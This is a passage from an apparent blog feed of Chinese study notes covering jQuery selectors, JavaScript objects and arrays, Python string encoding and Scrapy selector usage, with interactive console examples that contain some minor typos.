属于其父元素的第一个子元素的所有 p 元素 :first-of-type $(“p:first-of-type”) 属于其父元素的第一个 p 元素的所有p元素 :last-child $(“p:last-child”) 属于其父元素的最后一个子元素的所有 p 元素 :last-of-type $(“p:last-of-type”) 属于其父元素的最后一个 p 元素的所有 p 元素 :nth-child(n) $(“p:nth-child(2)”) 属于其父元素的第二个子元素的所有 p 元素 :nth-last-child(n) $(“nth-last-child(2)”) 属于其父元素的第二个子元素的所有 p 元素，从最后一个子元素开始计数 :nth-of-type(n) $(“p:nth-of-type(2)”) 属于其父元素的第二个 p 元素的所有 p 元素 :nth-last-of-type(n) $(“p:nth-last-of-type(2)”) 属于其父元素的第二个 p 元素的所有 p 元素，从最后一个子元素开始计数 :only-child $(“p:only-child”) 属于其父元素的唯一子元素的所有 p 元素 :only-of-type $(“p:only-of-type”) 属于其父元素的特定类型的唯一子元素的所有 p 元素 parent&gt;child $(“div&gt;p”) div 元素的直接子元素的所有 p 元素 parent descendant $(“div p”) div 元素的后代的所有 p元素 element+next $(“div+p”) 每个 div 元素相邻的下一个 p 元素 element~siblings $(“div~p”) div 元素同级的所有 p 元素 :eq(index) $(“ul li:eq(3)”) 列表中的第四个元素（index 值从 0 开始） :gt(no) $(“ul li:gt(3)”) 列举 index 大于 3 的元素 :lt(no) $(“ul li:lt(3)”) 列举 index 小于 3 的元素 :not(selector) $(“input:not(:empty)”) 所有不为空的输入元素 :header $(“:header”) 所有标题元素 h1, h2 … :animated $(“:animated”) 所有动画元素 :focus $(“:focus”) 当前具有焦点的元素 :contains(text) $(“:contains(“Hello”)”) 所有包含文本 “Hello” 的元素 :has(selector) $(“div:has(p)” 所有包含有 元素在其内的 元素 :empty $(“:empty”) 所有空元素 :parent $(“:parent”) 所有是另一个元素的父元素的元素 :hidden $(“p:hidden”) 所有隐藏的 p 元素 :visible $(“table:visible”) 所有可见的表格 :root $(“:root”) 文档的根元素 :lang(language $(“p:lang(de)”) 所有带有以 “de” 开头的 lang 属性值的 p 元素 [attribute] $(“[href]”) 所有带有 href 属性的元素 [attribute=value] $(“[href=’default.htm]”) 所有带有 href 属性且值等于 “default.htm” 的元素 [attribute!=value] $(“[href!=’default.htm’]”) 所有带有 href 属性且值不等于 “default.htm” 的元素 [attribute$=value] $(“[href$=’.jpg’]”) 所有带有 href 属性且值以 “.jpg” 结尾的元素 [attribute或=value] $(“[title或=’Tomorrow’]”) 所有带有 title 属性且值等于 ‘Tomorrow’ 或者以 ‘Tomorrow’ 后跟连接符作为开头的字符串 [attribute^=value] $(“title^=’Tom’”) 所有带有 title 属性且值以 “Tom” 开头的元素 [attribute~=value] $(“[title~=’hello’]”) 所有带有 title 属性且值包含单词 “hello” 的元素 [attribute*=value] $(“[title*=’hello’]”) 所有带有 title 属性且值包含字符串 “hello” 的元素 [name=value][name2=value2] $(“input[id][name$=’man’]”) 带有 id 属性，并且 name 属性以 man 结尾的输入框 :input $(“:input”) 所有 input 元素 :text $(“:text”) 所有带有 type=”text” 的 input 元素 :password $(“:password”) 所有带有 type=”password” 的 input 元素 :radio $(“:radio”) 所有带有 type=”radio” 的 input 元素 :checkbox $(“:checkbox”) 所有带有 type=”checkbox” 的 input 元素 :submit $(“:submit”) 所有带有type=”submit”的input元素 :reset $(“:reset”) 所有带有type=”reset”的input元素 :button $(“:button”) 所有带有 type=”button” 的 input 元素 :image $(“:image”) 所有带有 type=”image” 的 input 元素 :file $(“:file”) 所有带有 type=”file” 的 input 元素 :enabled $(“:enabled”) 所有启用的元素 :disabled $(“:disabled”) 所有禁用的元素 :selected $(“:selected”) 所有选定的下拉列表元素 :checked $(“:checked”) 所有选中的复选框选项 :target $(“p:target”) 选择器将选中ID和URI中一个格式化的标识符相匹配的p元素]]></content>
      <categories>
        <category>JavaScript</category>
        <category>jQuery</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于JavaScript对象的知识点]]></title>
    <url>%2F2017%2F02%2F22%2Ffirst%2F</url>
    <content type="text"><![CDATA[instanceof操作符通过instanceof操作符，我们可以测试一个对象是不是由某个指定的构造器函数所创建的。例如:>&gt;&gt; function Hero(){}>&gt;&gt; var h = new Hero(){};>&gt;&gt; var o = {};>&gt;&gt; h instanceof Hero;true>&gt;&gt; h instanceof Object;true>&gt;&gt; o instanceof Object;true请注意，这里的函数名后面没有加括号(即不是h instanceof Hero()),因为这里不是函数调用，所以我们只需要像使用其他变量一样，引用该函数的名字即可。 返回对象的函数除了使用new操作符来调用构造函数以外，我们也可以抛开new操作符，只用一般函数来创建对象，这就需要一个能执行某些预备工作，并以对象为返回值的函数。例如，下面就有一个用于产生对象的简单函数fanctory();12345function factory(name)&#123; return &#123; name: name&#125;;&#125; 然后我们调用factory();>&gt;&gt; var o = factory(‘one’);>&gt;&gt; o.name“onw”>&gt;&gt; o.constructorObject()实际上，构造器函数也是可以返回对象的，只不过在this值得使用上会有所不同。这意味着我们需要修改构造器函数的默认行为。下面，我们来看看具体是怎么做。这是构造器的一般用法:>&gt;&gt; function C() {this.a=1};>&gt;&gt; var c = new C();>&gt;&gt; c.a1但现在要考虑的是这种用法:>&gt;&gt; function c2() {this.a=1;return {b:2};}>&gt;&gt; var c2= new C2();>&gt;&gt; typeof c2.a“undefined”>&gt;&gt; c2.b2能看出来发生了什么吗？在这里，构造器返回的不再是包含属性a的this对象，而是另一个包含属性b的对象。但这也只有在函数的返回值是一个对象时才会发生，而当我们企图返回的是一个非对象类型时，该构造器将会照常返回this。 传递对象当我们拷贝某个对象或者将它传递给某个函数时，往往传递的都是该对象的引用。因此我们在引用上所做的任何改动，实际上都会影响它所引用的原对象。在下面的示例中，我们将会看到对象是如何赋值给另一个变量的，并且，如果我们对该拷贝做一些改变操作的话，原对象也会跟着被改变:12345678&gt;&gt;&gt; var original = &#123;howmany:1&#125;;&gt;&gt;&gt; var copy = original;&gt;&gt;&gt; copy.howmany1&gt;&gt;&gt; copy.howmany = 100;100&gt;&gt;&gt; original.howmany100 同样的，将对象传递给函数的情况也大致如此:12345&gt;&gt;&gt; var original = &#123;howmany: 100&#125;;&gt;&gt;&gt; var nullify = function(o) &#123;o.howmany=0;&#125;&gt;&gt;&gt; nullify(original);&gt;&gt;&gt; original.howmany0 对象比较当我们对对象进行比较操作时，当且仅当两个引用指向同一个对象时为true，而如果是不同的对象，即使他们碰巧拥有相同的属性和方法，比较操作也会放回false。下面，我们来创建两个看上去完全相同的对象:12&gt;&gt;&gt; var fido = &#123;breed:'dog'&#125;;&gt;&gt;&gt; var benji = &#123;breed: 'dog'&#125; 然后，我们对它进行比较，操作将会返回false:1234&gt;&gt;&gt; benji === fidofalse&gt;&gt;&gt; benji == fidofalse 我们可以创建一个变量mydog,并将其中一个对象赋值给它。这样一来mydog实际上指向了这个变量。1var mydog = benji; 在这种情况下，mydog与benji所指向的对象是相同的(也就是说，改变myblog的属性就等同于改变benji)，比较操作就会返回true。12&gt;&gt;&gt; mydog === benjitrue 并且，由于fido是一个不同的对象，所以它不能与mydog进行比较。12&gt;&gt;&gt; mydog === fidofalse ObjectObject是JavaScript中所有对象的父级对象，这意味着我们创建的所有对象都继承与此。为了新建一个空对象，我们既可以用对象文本标识法也可以调用Object()构造器函数，即下面这两行代码的执行结构是等价的:12&gt;&gt;&gt; var o = &#123;&#125;;&gt;&gt;&gt; var o = new Object(); 所谓的空对象，实际上并非是完全无用的，它还是包含了一些方法和属性。下面，我们来看看其中的一小部分: 返回构造器函数的构造属性。 返回对象描述字符串的toString()方法。 返回对象单值描述信息的valueOf()方法。一般情况下，返回的就是对象本身。现在来看看这些方法的实际应用。首先，我们来创建一个对象:1&gt;&gt;&gt; var o = new Object(); 然后调用toString()方法，返回该对象的描述字符串:12&gt;&gt;&gt; o.toString()"[object Object]" toString()方法会在某些需要用字符串来表示对象的时候被JavaScript内部调用。例如alert()工作就需要用到这样的字符串。所以如果我们将对象传递给了一个alert()函数，toString()方法就会在后台被调用，也就是说，下面两行代码的执行结果是相同的:12&gt;&gt;&gt; alert(o)&gt;&gt;&gt; alert(o.toString()) 另一种会使用字符串描述文本的地方就是字符串连接操作，如果我们将某个对象与字符串进行连接，那么该对象就先调用自身的toString()方法:12&gt;&gt;&gt; "An object:"+o"An object:[object Object]" valueOf()方法也是一个所有的对象所共有的方法。对于简单的额对对象来说(即构造器是Object的对象)，valueOf()方法返回的就是对象自己。12&gt;&gt;&gt; o.valueOf() === otrue 总而言之: 我们创建对象时既可以用var o = {}的形式，也可以用var o = new Object()。 无论是多复杂的对象，它都是继承自Object对象的，并且拥有其所有的方法和属性。ArrayArray()是一个用来构建数组的內建构造器函数，例如:1&gt;&gt;&gt; var a = new Array(); 这与下面的数组文本标识法是等效的:1&gt;&gt;&gt; var a = []; 无论数组是以什么方式创建的，我们都能照常往里添加元素:12&gt;&gt;&gt; a[0] = 1;a[1] = 2; a;[1,2] 当我们使用Array()构造器创建数组时，也可以通过传值的方式为其设定元素。123&gt;&gt;&gt; var a = new Array(1,2,3,'four');&gt;&gt;&gt; a;[1,2,3,"four"] 但是如果我们传递给该构造器的是一个数字，就会出现一种异常情况，即该数值会认为是数组的长度。123&gt;&gt;&gt; var a2 = new Array(5);&gt;&gt;&gt; a2;[undefined,undefined,undefined,undefined,undefined] 既然数组是由构造器创建的，那么这是否意味着数组实际上是一个对象呢？的确如此，我们可以用typeof操作符来验证一下:12&gt;&gt;&gt; typeof a;"object" 由于数组也是对象，那么就说明它也继承了Object的所有方法和属性。123456&gt;&gt;&gt; a.toString();"1,2,3,four"&gt;&gt;&gt; a.valueOf()[1,2,3,"four"]&gt;&gt;&gt; a.constructorArray() 尽管数组也是对象，但还是有一些特殊之处，因为： 他们的属性名都是从0开始递增的，并自动生成数值 它们拥有一个记录数组中元素数量的length属性。 它们都是在父级对象的基础上扩展额外的內建方法。下面来实际验证一下对象与数组之间的区别，让我们从创建空对象o和空数组a开始:1&gt;&gt;&gt; var a = [], o = &#123;&#125;; 首先，定义数组对象时会自动生成一个length属性，而这在一般对象中是没有的。1234&gt;&gt;&gt; a.length0&gt;&gt;&gt; typeof o.length"undefined" 在为数组和对象添加数字和非数字属性方面，两者并没有什么区别:12&gt;&gt;&gt; a[0] = 1;o[0]=1;&gt;&gt;&gt; a.prop = 2; o.prop = 2; length属性通常会随着数字属性的数量而更新，而非数字属性则会被忽略。12&gt;&gt;&gt; a.length1 当然我们也可以手动设置length属性。如果设置的值大于当前数组中元素数量，剩下的部分会被自动创建空对象所填充。1234&gt;&gt;&gt; a.length-55&gt;&gt;&gt; a[1,undefined,undefined,undefined,undefined] 而如果我们设置的length值小于当前元素数，多出的那部分元素会被移除:1234&gt;&gt;&gt; a.length -2 2&gt;&gt;&gt; a[1,undefined] 值得关注的数组方法除了从父级对象那里继承的方法以外，数组对象中还有一些更为有用的方法，例如sort(),join()和slice()等。下面，我们将通过一个数组来试验一下这方法:1&gt;&gt;&gt; var a = [3,5,1,7,'test']; push()方法会在数组的末端添加一个新元素，而pop()方法会移除最后一个元素，也就是说a.push(“new”)就相当于a[a.length]=”new”,而a.pop()则与a.length–的结果相同。另外，push()返回的是改变后的数组长度，而pop所返回的是被移除的元素。12345678&gt;&gt;&gt; a.push("new");6&gt;&gt;&gt; a[3,5,1,7,"test","new"]&gt;&gt;&gt; a.pop();"new"&gt;&gt;&gt; a[3,5,1,7,"test"] 而sort方法则是用于给数组排序的，它会返回修改后的数组，在下面的示例中，排序完成后，a和b所指向的数组是相同的:12345&gt;&gt;&gt; var b = a.sort();&gt;&gt;&gt; b[1,3,5,7,"test"]&gt;&gt;&gt; a[1,3,5,7,"test"] join()方法会返回一个由目标数组中所有元素值连接而成的字符串，另外，我们还可以通过该方法的参数来设定这些元素之间的字符串。例如:12&gt;&gt;&gt; a.join(' is not');"1 is not 3 is not 5 is not 7 is not test" slice() 方法会在不修改目标数组的情况下返回其中的某个片段，该片段的首尾索引位置由slice()的头两个参数来指定(都以0为基数)。123456&gt;&gt;&gt; b = a.slice(1,3);[3,5]&gt;&gt;&gt; b = a.slice(0,1);[1]&gt;&gt;&gt; b = a.slice(0,2);[1,3] 所有的截取完成之后，原数组的状态不变:12&gt;&gt;&gt; a[1,3,5,7,"test"] splice() 则是会修改目标数组的，它会移除并返回指定切片，并且在可选情况下，它还会用指定的新元素来填补被切除的空缺。该方法的头两个参数所指定的是要移除切片的首尾索引位置，其他参数则是用于填补新元素的值。1234&gt;&gt;&gt; b = a.splice(1,2,100,101,102);[3,5]&gt;&gt;&gt; a[1,100,101,102,7,"test"] 当然，用于填补空缺的新元素是可选的，我们也可以直接跳过:1234&gt;&gt;&gt; a.splice(1,3)[100,101,102]&gt;&gt;&gt; a[1,7,"test"] Function之前，我们已经了解了函数是一种特殊的数据类型，但事实还远远不止如此，它实际上是一种对象，函数对象的內建构造器是Function()，我们可以将它作为创建函数的一种备选方式(但我门不推荐这种方式)也就是说下面三种定义函数的方式都是等效的:123456789&gt;&gt;&gt; function sum(a,b) &#123;return a+b&#125;;&gt;&gt;&gt; sum(1,2)3&gt;&gt;&gt; var sum = function(a,b) &#123;return a+b&#125;;&gt;&gt;&gt; sum(1,2);3&gt;&gt;&gt; var sum = new Function('a','b','return a+b;');&gt;&gt;&gt; sum(1,2)3]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gbk,unicode,ASCII,utf-8,utf-16编码转换]]></title>
    <url>%2F2017%2F02%2F22%2Fthird%2F</url>
    <content type="text"><![CDATA[将unicode转化为普通Python字符串:”encode”demo = u”Hello world”utf8string = demo.encode(“utf-8”)asciistring = demo.encode(“ascii”)isostring = demo.encode(“ISO-8859-1”)utf16string = demo.encode(“utf-16”) 将普通python字符串转化为Unicode:”decode”demo = unicode(utf8string,”utf-8”)demo = unicode(asciistring,”ascii”)demo = unicode(isostring,”ISO-8859-1”)demo = unicode(utf16string,”utf-16”)]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrapy爬虫技术九]]></title>
    <url>%2F2017%2F02%2F22%2Fsecond%2F</url>
    <content type="text"><![CDATA[选择器(Selectors)选择器顾名思义就是选择的意思，就是从HTML源码中提取数据。现有哪些工具可以使用呢？ BeautifulSoup是在程序员间非常流行的网页分析库，它基于HTML代码的结构来构造一个Python对象，对不良标记的处理也非常合理，它有一个缺点:慢。 lxml是一个基于ElementTree的python化的XML解析库(也可以解析html) Scrapy提取数据有自己的一套机制，他们被称作选择器。因为他们通过特定的XPath或者CSS表达式来选择HTML文件中的某个部分。 XPath是一门用来在XML文件中选择节点的语言，也可以用在HTML上。CSS是一门将HTML文档样式化的语言。选择器由它定义，并与特定的HTML元素的样式相关连。 使用选择器构造选择器scrapy selector是以文字(text)或TextResponse构造的Selector实例。其根据输入的类型自动选择最优的分析方法(XML vs HTML):12&gt;&gt;&gt; from scrapy.selector import Selector&gt;&gt;&gt; from scrapy.http import HtmlResponse 以文字构造:123&gt;&gt;&gt; body = '&lt;html&gt;&lt;body&gt;&lt;span&gt;good&lt;/span&gt;&lt;/body&gt;&lt;/html&gt;'&gt;&gt;&gt; Selector(text=body).xpath('//span/text()').extract()[u'good'] 以response构造:123&gt;&gt;&gt; response = HtmlResponse(url='http://example.com',body=body)&gt;&gt;&gt; Selector(response=response).xpath('//span/text()').extract()[u'good'] 为了方便起见，response对象.selector属性提供了一个selector,您可以随时使用该快捷方法:12&gt;&gt;&gt; response.selector.xpath('//span/text()').extract()[u'good'] 实例:爬取地址:http://doc.scrapy.org/en/latest/_static/selectors-sample1.html爬取的源码：123456789101112131415&lt;html&gt; &lt;head&gt; &lt;base href='http://example.com/' /&gt; &lt;title&gt;Example website&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id='images'&gt; &lt;a href='image1.html'&gt;Name: My image 1 &lt;br /&gt;&lt;img src='image1_thumb.jpg' /&gt;&lt;/a&gt; &lt;a href='image2.html'&gt;Name: My image 2 &lt;br /&gt;&lt;img src='image2_thumb.jpg' /&gt;&lt;/a&gt; &lt;a href='image3.html'&gt;Name: My image 3 &lt;br /&gt;&lt;img src='image3_thumb.jpg' /&gt;&lt;/a&gt; &lt;a href='image4.html'&gt;Name: My image 4 &lt;br /&gt;&lt;img src='image4_thumb.jpg' /&gt;&lt;/a&gt; &lt;a href='image5.html'&gt;Name: My image 5 &lt;br /&gt;&lt;img src='image5_thumb.jpg' /&gt;&lt;/a&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 打开shell，输入1scrapy shell http://doc.scrapy.org/en/latest/_static/selectors-sample1.html 接着，当shell挂在后，您将获得名为response的shell变量，其为响应的response,并且在其response.selector属性上绑定了一个selector。构建一个XPath来选择title标签内的文字12response.selector.xpath('//title/text()')[&lt;Selector (text) xpath=//title/text()&gt;] 由于在response中使用XPath、CSS查询十分普遍，因此，scrapy提供了两个实用的快捷方式，response.xpath()及response.css();1234&gt;&gt;&gt; response.xpath('//title/text()')[&lt;Selector (text) xpath=//title/text()&gt;]&gt;&gt;&gt; response.css('title::text')[&lt;Selector(text) xpath=//title/text()&gt;] 如你所见，.xpath()及.css()方法返回一个类Selector的实例，它是一个新选择器的列表。为了提取真实的原文数据，你需要调用.extract()方法如下:12&gt;&gt;&gt; response.xpath('//title/text()').extract()[u'Example website'] 注意CSS选择器可以使用CSS3伪元素来选择文字或者属性节点:12&gt;&gt;&gt; response.css('title::text').extract()[u'Example website'] 现在我们将得到根URL(base URL)和一些图片链接:123456789101112&gt;&gt;&gt; response.xpath('//base/@href').extract()[u'http://example.com/']&gt;&gt;&gt; response.css('base::attr(href)')extract()[u'http://example.com/']&gt;&gt;&gt; response.xpath('//a[contains(@href,"image")]/@href').extract()[u'image1.html',u'image2.html',u'image3.html',u'image4.html',u'image5.html']&gt;&gt;&gt; response.xpath('a[href*=image]::attr(href)').extract()[u'image1.html',u'image2.html',u'image3.html',u'image4.html',u'image5.html']&gt;&gt;&gt; response.xpath('//a[contains(@href,"image")]/img/@src').extract()[u'image1_thumb.jpg',u'image2_thumb.jpg',u'image3_thumb.jpg',u'image4_thumb.jpg',u'image5_thumb.jpg']&gt;&gt;&gt; response.css('a[href*=image] img::attr(src)').extract()[u'image1_thumb.jpg',u'image2_thumb.jpg',u'image3_thumb.jpg',u'image4_thumb.jpg',u'image5_thumb.jpg'] 嵌套选择器选择器方法.xpath()或者.css()返回相同类型的选择器列表，因此你也可以对这些选择器调用选择器方法。123456789101112131415&gt;&gt;&gt; links=response.xpath('//a[contains(@href,'image')]')&gt;&gt;&gt; links.extract()[u'&lt;a href="image1.html"&gt;Name: My image 1 &lt;br&gt;&lt;img src="image1_thumb.jpg"&gt;&lt;/a&gt;', u'&lt;a href="image2.html"&gt;Name: My image 2 &lt;br&gt;&lt;img src="image2_thumb.jpg"&gt;&lt;/a&gt;', u'&lt;a href="image3.html"&gt;Name: My image 3 &lt;br&gt;&lt;img src="image3_thumb.jpg"&gt;&lt;/a&gt;', u'&lt;a href="image4.html"&gt;Name: My image 4 &lt;br&gt;&lt;img src="image4_thumb.jpg"&gt;&lt;/a&gt;', u'&lt;a href="image5.html"&gt;Name: My image 5 &lt;br&gt;&lt;img src="image5_thumb.jpg"&gt;&lt;/a&gt;']&gt;&gt;&gt; for index,link in enumerate(links): args=(index,link,xpath('@href').extract(),link.xpath('img/@src').extract()) print 'Link number %d points to url %s and image %s' % argsLink number 0 points to url [u'image1.html'] and image [u'image1_thumb.jpg']Link number 1 points to url [u'image2.html'] and image [u'image2_thumb.jpg']Link number 2 points to url [u'image3.html'] and image [u'image3_thumb.jpg']Link number 3 points to url [u'image4.html'] and image [u'image4_thumb.jpg']Link number 4 points to url [u'image5.html'] and image [u'image5_thumb.jpg'] 综合正则表达式使用选择器Selector也有一个.re()方法，用来通过正则表达式来提取数据。然而，不同于.xpath()或者.css()方法，.re()方法返回unicodee字符串列表。所以你无法构造嵌套式的.re()使用。例子:123456&gt;&gt;&gt; response.xpath('//a[contains(@href,"image")]/text()').re(r'Name:\s*(.*)')[u'My image 1', u'My image 2', u'My image 3', u'My image 4', u'My image 5'] 使用相对XPaths记住如果你使用嵌套的选择器，并使用起始位/的XPath，那么该XPath将对文档使用绝对路径，而且对于你调用的Selector不是相对路径。比如，假设你想提取在元素中的所有元素。首先，你将先得到所有的元素:>&gt;&gt; divs = response.xpath(‘//div’)开始时，你可能会尝试使用下面的错误的方法，因为它其实是从整篇文档中，而不仅仅是从那些元素内部提取所有的元素。12&gt;&gt;&gt; for p in divs.xpath('//p'): print p.extract() 下面是比较合适的处理方法(注意.//pXPath的点前缀12&gt;&gt;&gt; for p in divs.xpath('.//p'): print p.extract() 另一种常见的情况将是提取所有直系的结果:12&gt;&gt;&gt; for p in divs.xpath('p'): print p.extract() 使用EXSLT扩展因建于lxml之上，scrapy选择器也支持一些EXSLT扩展，可以在XPath表达式中使用预先制定的命名空间。 前缀 命名空间 用途 re http://exslt.org/regular-expressions 正则表达式 set http://exslt.org/sets 集合操作 正则表达式例如在XPath的starts-with()或contains()无法满足需求时，test()函数可以非常有用。例如在列表中选择有”class”元素且结尾为一个数字的链接:1234567891011121314151617&gt;&gt;&gt; from scrapy imort Selector&gt;&gt;&gt; doc ="""... &lt;div&gt;... &lt;ul&gt;... &lt;li class="item-0"&gt;&lt;a href="link1.html"&gt;first item&lt;/a&gt;&lt;/li&gt;... &lt;li class="item-1"&gt;&lt;a href="link2.html"&gt;second item&lt;/a&gt;&lt;/li&gt;... &lt;li class="item-inactive"&gt;&lt;a href="link3.html"&gt;third item&lt;/a&gt;&lt;/li&gt;... &lt;li class="item-1"&gt;&lt;a href="link4.html"&gt;fourth item&lt;/a&gt;&lt;/li&gt;... &lt;li class="item-0"&gt;&lt;a href="link5.html"&gt;fifth item&lt;/a&gt;&lt;/li&gt;... &lt;/ul&gt;... &lt;/div&gt;... """&gt;&gt;&gt; sel = Selector(text=doc,type="html")&gt;&gt;&gt; sel = xpath('//li/@href').extract()[u'link1.html', u'link2.html', u'link3.html', u'link4.html', u'link5.html']&gt;&gt;&gt; sel.xpath('//li[re:test(@class,"item-\d$")]/@href').extract()[u'link1.html', u'link2.html', u'link4.html', u'link5.html'] 提醒:C语言库libxslt不原生支持EXSLT正则表达式，因此lxml在实现时使用了python re 模块的钩子。因此，在XPath表达式中使用regexp函数可能会牺牲少量的性能。 集合操作集合操作可以方便地用于在提取文字元素前从文档中去除一些部分。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&gt;&gt;&gt; doc = """... &lt;div itemscope itemtype="http://schema.org/Product"&gt;... &lt;span itemprop="name"&gt;Kenmore White 17" Microwave&lt;/span&gt;... &lt;img src="kenmore-microwave-17in.jpg" alt='Kenmore 17" Microwave' /&gt;... &lt;div itemprop="aggregateRating"... itemscope itemtype="http://schema.org/AggregateRating"&gt;... Rated &lt;span itemprop="ratingValue"&gt;3.5&lt;/span&gt;/5... based on &lt;span itemprop="reviewCount"&gt;11&lt;/span&gt; customer reviews... &lt;/div&gt;...... &lt;div itemprop="offers" itemscope itemtype="http://schema.org/Offer"&gt;... &lt;span itemprop="price"&gt;$55.00&lt;/span&gt;... &lt;link itemprop="availability" href="http://schema.org/InStock" /&gt;In stock... &lt;/div&gt;...... Product description:... &lt;span itemprop="description"&gt;0.7 cubic feet countertop microwave.... Has six preset cooking categories and convenience features like... Add-A-Minute and Child Lock.&lt;/span&gt;...... Customer reviews:...... &lt;div itemprop="review" itemscope itemtype="http://schema.org/Review"&gt;... &lt;span itemprop="name"&gt;Not a happy camper&lt;/span&gt; -... by &lt;span itemprop="author"&gt;Ellie&lt;/span&gt;,... &lt;meta itemprop="datePublished" content="2011-04-01"&gt;April 1, 2011... &lt;div itemprop="reviewRating" itemscope itemtype="http://schema.org/Rating"&gt;... &lt;meta itemprop="worstRating" content = "1"&gt;... &lt;span itemprop="ratingValue"&gt;1&lt;/span&gt;/... &lt;span itemprop="bestRating"&gt;5&lt;/span&gt;stars... &lt;/div&gt;... &lt;span itemprop="description"&gt;The lamp burned out and now I have to replace... it. &lt;/span&gt;... &lt;/div&gt;...... &lt;div itemprop="review" itemscope itemtype="http://schema.org/Review"&gt;... &lt;span itemprop="name"&gt;Value purchase&lt;/span&gt; -... by &lt;span itemprop="author"&gt;Lucas&lt;/span&gt;,... &lt;meta itemprop="datePublished" content="2011-03-25"&gt;March 25, 2011... &lt;div itemprop="reviewRating" itemscope itemtype="http://schema.org/Rating"&gt;... &lt;meta itemprop="worstRating" content = "1"/&gt;... &lt;span itemprop="ratingValue"&gt;4&lt;/span&gt;/... &lt;span itemprop="bestRating"&gt;5&lt;/span&gt;stars... &lt;/div&gt;... &lt;span itemprop="description"&gt;Great microwave for the price. It is small and... fits in my apartment.&lt;/span&gt;... &lt;/div&gt;... ...... &lt;/div&gt;... """&gt;&gt;&gt;&gt;&gt;&gt; for scope in sel.xpath('//div[@itemscope]'):... print "current scope:", scope.xpath('@itemtype').extract()... props = scope.xpath('''... set:difference(./descendant::*/@itemprop,... .//*[@itemscope]/*/@itemprop)''')... print " properties:", props.extract()... print...current scope: [u'http://schema.org/Product'] properties: [u'name', u'aggregateRating', u'offers', u'description', u'review', u'review']current scope: [u'http://schema.org/AggregateRating'] properties: [u'ratingValue', u'reviewCount']current scope: [u'http://schema.org/Offer'] properties: [u'price', u'availability']current scope: [u'http://schema.org/Review'] properties: [u'name', u'author', u'datePublished', u'reviewRating', u'description']current scope: [u'http://schema.org/Rating'] properties: [u'worstRating', u'ratingValue', u'bestRating']current scope: [u'http://schema.org/Review'] properties: [u'name', u'author', u'datePublished', u'reviewRating', u'description']current scope: [u'http://schema.org/Rating'] properties: [u'worstRating', u'ratingValue', u'bestRating']&gt;&gt;&gt; 在这里，我们首先在itemscope元素上迭代，对于其中一个元素，我们寻找所有的itemprops元素，并排除那些本身在另一个itemscope内的元素。 內建选择器参考 xpath(query)寻找可以匹配xpath query的节点，并返回SelectorList的一个实例结果，单一化其所有元素，列表元素也实现了Slector的接口。 css(query)应用给定的CSS选择器，返回SelectorList的一个实例。query是一个包含CSS选择器的字符串。在后台通过cssselect库和运行.path()方法，CSS查询会被转换为XPath查询。 extract()串行化并将匹配到的节点返回一个unicode字符串列表。结尾是编码内容的的百分比。 re(regex)应用给定的regex,并返回匹配到的unicode字符串列表。regex可以是一个已编译的正则表达式，也可以是一个将被re.compile(regex)编译为正则表达式的字符串。]]></content>
      <categories>
        <category>python</category>
        <category>scrapy</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[对象]]></title>
    <url>%2F2017%2F02%2F18%2Fsecond%2F</url>
    <content type="text"><![CDATA[从数组到对象>&gt;&gt; var myarr = [‘red’,’blue’,’yellow’,’purple’];>&gt;&gt; myarr;[“red”,”blue”,”yellow”,”purple”]>&gt;&gt; myarr[0]“red”>&gt;&gt; myarr[3]“purple”对象的情况跟数组很类似，唯一的不同是它的键值类型是自定义的。也就是说，我们的索引方式不再局限于数字了，而可以使用一些更为人性化的键值，比如first_name,age等。示例:1234var hero = &#123; breed : 'Turtle', occupation: 'Ninja'&#125;; 正如我们所见: 这里有一个用于表示该对象的变量名hero。 与定义数组时所用的中括号[]不同，对象使用的是大括号{}。 括号中用逗号分割着的是组成该对象的元素(通常被称之为属性)。 键/值对之间用冒号分割，例如,key:value。有时候，我们还可以在键值(属性名)上面加一对引号，例如，下面三行代码所定义的内容是完全相同的:var o = {prop:1};var o = {“prop”:1};var o = {‘prop’:1};如果我们所选的属性名不符合JavaScript中的变量名规则，就必须对其施加一对引号。12345var o = &#123; something: 1, 'yes or no':'yes', '!#%^^&amp;*': true&#125;; 该对象合法。 元素，属性，方法对象的属性也可以是一个函数，因为函数本身也是一种数据，在这种情况下，我们会称该属性为方法，例如:123456var dog = &#123; name : 'Benji', talk : function()&#123; alert('woof,woof!');&#125;&#125;; 当然我们也可以像下面这样，在数组中存储一些函数元素并在需要时调用它们，这在实践中并不多见。>&gt;&gt; var a = [];>&gt;&gt; a[0] = function(what){alert(what);};>&gt;&gt; a0; 哈希表、关联型数组 一般性数组，也叫做索引型数组或者枚举型数组(通常以数字为键值) 关联型数组，也叫做哈希表(通常以字符串为键值)访问对象属性 一种是中括号表示法，例如hero[‘ocuupation’] 另一种则是点号表示法，例如hero.occupation尽管相对而言，点号表示法更易于读写，但也不是总能适用的。其中的属性和命名原则相同，即如果我们所访问的属性没有一个合法的名字，它就不能通过点号表示访问。让我们来看一个具体的对象:1234var hero = &#123; breed: 'Turtle', occupation:'Ninja'&#125;; 下面我们用点号表示法来访问操作:>&gt;&gt; hero.breed;“Turtle”再用中括号表示法来访问属性:>&gt;&gt; hero[‘occupation’];“Ninja”如果我们访问的属性不存在，代码就会返回undefined。>&gt;&gt; ‘Hair color is’+hero.hair_color;‘Hair color is undefined’另外，由于对象中可以包含任何类型的数据，自然也包括其他对象：12345678var book = &#123; name: 'Catch-22', published: 1961, author: &#123; firstname:'Joseph', lastname: 'Heller' &#125;&#125;; 在这里，如果我们想访问book对象的author属性对象的firstname需要这样:>&gt;&gt; book.author.firstname‘Joseph’当然，也可以连续使用中括号表示法，例如:>&gt;&gt; book[‘author’][‘lastname’]‘Heller’甚至可以混合使用这两种表示法，例如:>&gt;&gt; book.author[‘lastname’]‘Heller’>&gt;&gt; book[‘author’].lastname‘Heller’另外还有一种情况，即如果我们要访问的属性名是不确定的，就必须使用中括号表示法了，它允许我们在运行时通过变量来实现相关属性的动态存取。>&gt;&gt; var key = ‘firstname’;>&gt;&gt; book.author[key];“Joseph” 